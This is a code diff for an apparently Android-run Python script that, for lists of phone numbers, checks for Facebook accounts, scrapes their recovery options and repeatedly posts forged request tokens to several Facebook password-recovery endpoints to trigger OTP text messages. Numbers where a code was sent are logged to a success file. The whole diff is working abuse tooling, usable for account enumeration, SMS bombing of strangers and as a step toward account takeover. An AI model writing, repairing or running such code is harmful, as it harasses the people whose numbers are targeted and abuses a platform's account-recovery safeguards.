@@ -177,145 +177,155 @@ def process_number(any_number, selected_ua, success_file):
             stats['no_id'] += 1
             print(f"{Fore.RED}[-] {any_number} : No Account Found")
             return
-        # Extract recovery methods - FIXED VERSION
-        recovery_methods = []
+        print(f"{Fore.GREEN}[✓] {any_number} : Account Found!")
         
-        # Method 1: Look for SMS options in input fields
-        sms_patterns = [
-            r'value="(send_sms.*?)"',
-            r'value="(.*sms.*)"',
-            r'name="recover_method"\s+value="(.*?)"',
-            r'recover_method.*?value=["\'](.*?)["\']'
-        ]
+        # Step 3: Extract recovery options
+        print(f"{Fore.CYAN}[~] {any_number} : Looking for recovery options...")
         
-        for pattern in sms_patterns:
-            matches = re.findall(pattern, response.text, re.IGNORECASE)
-            for match in matches:
-                if 'sms' in match.lower():
-                    recovery_methods.append(match)
+        # Method 1: Look for data-store attribute (Facebook's new format)
+        recovery_method = None
+        contact_index = "0"
         
-        # Method 2: Look for radio buttons
-        if not recovery_methods:
-            radio_matches = re.findall(r'<input[^>]*type=["\']radio["\'][^>]*value=["\']([^"\']*sms[^"\']*)["\'][^>]*>', 
-                                      response.text, re.IGNORECASE)
-            recovery_methods.extend(radio_matches)
+        # Try to find recovery method in data-store
+        data_store_pattern = r'data-store=["\'][^"\']*recover_method["\'][^"\']*["\']'
+        data_store_matches = re.findall(data_store_pattern, search_response.text, re.IGNORECASE)
         
-        # Method 3: Look for data-store attribute
-        if not recovery_methods:
-            data_store_matches = re.findall(r'data-store=["\'][^"\']*sms[^"\']*["\']', response.text, re.IGNORECASE)
-            for match in data_store_matches:
-                value = re.search(r'value=["\']([^"\']+)["\']', match)
-                if value:
-                    recovery_methods.append(value.group(1))
+        for match in data_store_matches:
+            # Extract recover_method value
+            method_match = re.search(r'recover_method["\']:["\']([^"\']+)["\']', match)
+            if method_match:
+                recovery_method = method_match.group(1)
+                # Extract contact_index if available
+                index_match = re.search(r'contact_index["\']:["\']([^"\']+)["\']', match)
+                if index_match:
+                    contact_index = index_match.group(1)
+                break
         
-        if not recovery_methods:
-            # Try to find any recovery method
-            all_methods = re.findall(r'value="([^"]*)"', response.text)
-            for method in all_methods:
-                if len(method) > 5 and any(x in method.lower() for x in ['send', 'recover', 'method']):
-                    recovery_methods.append(method)
+        # Method 2: Look for input fields with name="recover_method"
+        if not recovery_method:
+            input_pattern = r'<input[^>]*name=["\']recover_method["\'][^>]*value=["\']([^"\']+)["\'][^>]*>'
+            input_matches = re.findall(input_pattern, search_response.text, re.IGNORECASE)
+            if input_matches:
+                recovery_method = input_matches[0]
         
-        if recovery_methods:
-            # Use the first SMS method found
-            selected_method = recovery_methods[0]
-            print(f"{Fore.CYAN}[~] {any_number} : Found recovery method: {selected_method}")
+        # Method 3: Look for send_sms in any input field
+        if not recovery_method:
+            sms_pattern = r'<input[^>]*value=["\'][^"\']*send_sms[^"\']*["\'][^>]*>'
+            sms_matches = re.findall(sms_pattern, search_response.text, re.IGNORECASE)
+            for sms_match in sms_matches:
+                value_match = re.search(r'value=["\']([^"\']+)["\']', sms_match)
+                if value_match and 'send_sms' in value_match.group(1).lower():
+                    recovery_method = value_match.group(1)
+                    break
+        
+        # Method 4: Look for SMS in the response text (last resort)
+        if not recovery_method:
+            text_pattern = r'send_sms(?:_\w+)?'
+            text_matches = re.findall(text_pattern, search_response.text, re.IGNORECASE)
+            if text_matches:
+                recovery_method = text_matches[0]
+        
+        if recovery_method:
+            print(f"{Fore.CYAN}[~] {any_number} : Found recovery method: {recovery_method}")
             
-            # Step 2: Send SMS request
+            # Step 4: Send SMS request
+            print(f"{Fore.CYAN}[~] {any_number} : Sending OTP...")
+            
+            # Get new lsd token for the send request
+            send_lsd_match = re.search(r'["\']lsd["\']\s*value=["\']([^"\']+)["\']', search_response.text)
+            if send_lsd_match:
+                send_lsd = send_lsd_match.group(1)
+            else:
+                send_lsd = lsd_token
+            
             sms_payload = {
-                'recover_method': selected_method,
-                'contact_index': '0',
-                'did_submit': 'Continue',
+                'lsd': send_lsd,
                 'jazoest': '2940',
-                'lsd': 'AdGpHjOQEFs',
+                'recover_method': recovery_method,
+                'contact_index': contact_index,
+                'did_submit': 'Continue',
+                'fbp': 'fb.1.1698765432101.1234567890',  # Generic fbp value
                 '__user': '0',
                 '__a': '1',
-                '__req': '7',
-                '__hs': '20468.BP:DEFAULT.2.0...0',
+                '__req': '1',
+                '__hs': '19560.BP:DEFAULT.2.0...0',
                 'dpr': '1',
                 '__ccg': 'EXCELLENT',
-                '__rev': '1032049861',
+                '__rev': '1000000000',
                 '__s': 'sflqtb:my7aaa:6evjim',
-                '__hsi': '7595674312159156008',
-                '__dyn': '7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa0CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQw4iwBgao6C0Mo2swaO4U2zxe3C0D85a1qw8Xxm16wa-0raazo7u0zE2ZwrU6C0hq1Iw5lwnqwIwtU5K0UE62',
-                '__hsdp': 'gIMggq8yqA7h0hp3D8py4bDyeeqKEyewQocAE7iO04Ewd63B240GGw4iw',
-                '__hblp': '0TwbO1nw5Uw3iUfE4-0a6wto0lUw28E08qU0hjw2A805h60c-w3YJ0fO6oll02ZU0qPw13i0FU',
-                '__spin_r': '1032049861',
+                '__hsi': '1234567890123456789',
+                '__dyn': '7xeUjG1mxu1syUbFp41nzU5W2O0V8S5UbFp41nzU5W2O0V8S5UbFp41nzU5W2O0V8S',
+                '__csr': '',
+                '__comet_req': '0',
+                'fb_dtsg': 'NA',
+                '__spin_r': '1000000000',
                 '__spin_b': 'trunk',
-                '__spin_t': '1768505739'
+                '__spin_t': '1698765432',
             }
             
             try:
-                send_response = session.post(
-                    'https://www.facebook.com/recover/code/send/',
-                    data=sms_payload,
-                    headers=headers,
-                    cookies=cookies,
-                    timeout=30,
-                    allow_redirects=True
-                )
-                
-                # Check if SMS was sent successfully
-                response_text = send_response.text.lower()
-                
-                # Success indicators
-                success_indicators = [
-                    'code sent',
-                    'enter confirmation code',
-                    'confirm phone number',
-                    'sent to your phone',
-                    'check your messages',
-                    'recover/code',
-                    'verification code'
+                # Try different endpoints
+                endpoints = [
+                    'https://www.facebook.com/ajax/login/help/identify.php?ctx=recover',
+                    'https://www.facebook.com/recover/code/',
+                    'https://www.facebook.com/recover/initiate/',
+                    'https://www.facebook.com/recover/code/send/'
                 ]
                 
-                # Error indicators
-                error_indicators = [
-                    'try again later',
-                    'temporarily blocked',
-                    'too many attempts',
-                    'security check',
-                    'rate limit'
-                ]
-                
-                if any(indicator in response_text for indicator in success_indicators):
-                    stats['success'] += 1
-                    print(f"{Fore.GREEN}[✓] {any_number} : OTP Sent Successfully!")
-                    
-                    # Save to success file
+                sms_sent = False
+                for endpoint in endpoints:
                     try:
-                        with open(success_file, 'a', encoding='utf-8') as f:
-                            f.write(f"{any_number}\n")
-                    except:
-                        # Try alternative location
-                        alt_file = '/sdcard/success_sent.txt' if success_file != '/sdcard/success_sent.txt' else 'success_sent.txt'
-                        with open(alt_file, 'a', encoding='utf-8') as f:
-                            f.write(f"{any_number}\n")
-                
-                elif any(indicator in response_text for indicator in error_indicators):
-                    stats['error'] += 1
-                    print(f"{Fore.YELLOW}[!] {any_number} : Rate Limited/Try Again Later")
-                
-                elif "not_my_account" in send_response.url or "identify" in send_response.url:
-                    stats['error'] += 1
-                    print(f"{Fore.YELLOW}[!] {any_number} : Failed - Redirected to Start")
-                
-                else:
-                    # Check status code
-                    if send_response.status_code == 200:
-                        stats['success'] += 1
-                        print(f"{Fore.GREEN}[✓] {any_number} : Request Sent (Status 200)")
+                        send_response = session.post(
+                            endpoint,
+                            data=sms_payload,
+                            headers=headers,
+                            cookies=session.cookies.get_dict(),
+                            timeout=30,
+                            allow_redirects=True
+                        )
                         
-                        # Save to success file
-                        try:
-                            with open(success_file, 'a', encoding='utf-8') as f:
-                                f.write(f"{any_number}\n")
-                        except:
-                            alt_file = '/sdcard/success_sent.txt' if success_file != '/sdcard/success_sent.txt' else 'success_sent.txt'
-                            with open(alt_file, 'a', encoding='utf-8') as f:
-                                f.write(f"{any_number}\n")
-                    else:
-                        stats['error'] += 1
-                        print(f"{Fore.YELLOW}[!] {any_number} : Failed (Status {send_response.status_code})")
+                        # Check response
+                        response_text = send_response.text.lower()
+                        
+                        # Success indicators
+                        success_indicators = [
+                            'code sent',
+                            'enter code',
+                            'confirmation code',
+                            'verification code',
+                            'sent to your phone',
+                            'check your phone',
+                            'recover/code',
+                            'security code'
+                        ]
+                        
+                        # Check URL
+                        current_url = send_response.url.lower()
+                        
+                        if any(indicator in response_text for indicator in success_indicators) or 'code' in current_url:
+                            stats['success'] += 1
+                            print(f"{Fore.GREEN}[✓] {any_number} : OTP Sent Successfully!")
+                            
+                            # Save to success file
+                            try:
+                                with open(success_file, 'a', encoding='utf-8') as f:
+                                    f.write(f"{any_number}\n")
+                            except:
+                                # Try alternative location
+                                alt_file = '/sdcard/success_sent.txt' if success_file != '/sdcard/success_sent.txt' else 'success_sent.txt'
+                                with open(alt_file, 'a', encoding='utf-8') as f:
+                                    f.write(f"{any_number}\n")
+                            
+                            sms_sent = True
+                            break
+                            
+                    except Exception as endpoint_error:
+                        continue
+                
+                if not sms_sent:
+                    # If no endpoint worked, check if we got any response
+                    stats['error'] += 1
+                    print(f"{Fore.YELLOW}[!] {any_number} : SMS Send Failed")
             
             except Exception as send_error:
                 stats['error'] += 1
@@ -324,6 +334,15 @@ def process_number(any_number, selected_ua, success_file):
         else:
             stats['no_sms'] += 1
             print(f"{Fore.YELLOW}[!] {any_number} : No SMS Recovery Option Available")
+            
+            # Debug: Save response for analysis
+            debug_filename = f"/sdcard/debug_{any_number}.html"
+            try:
+                with open(debug_filename, 'w', encoding='utf-8') as f:
+                    f.write(search_response.text)
+                print(f"{Fore.CYAN}[~] Debug info saved to: {debug_filename}")
+            except:
+                pass
     
     except requests.exceptions.Timeout:
         stats['error'] += 1
